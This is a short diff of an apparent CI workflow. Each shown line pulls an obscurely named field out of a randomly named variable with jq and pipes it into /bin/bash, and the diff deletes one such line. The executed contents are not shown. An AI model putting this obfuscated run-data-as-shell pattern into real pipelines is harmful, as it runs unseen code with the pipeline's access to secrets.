@@ -31,7 +31,6 @@ jobs:
           printf '%s' "$r7777" | jq -r .q8 | /bin/bash
           echo $h04243 | jq -r .u0692 | /bin/bash
           printf '%s' "$ei4891" | jq -r .c6 | /bin/bash
-          echo $hsc0281 | jq -r .ovf0 | /bin/bash
           echo $ahfl8 | jq -r .w808 | /bin/bash
           printf '%s' "$xyjih27910" | jq -r .ecob76972 | /bin/bash
 
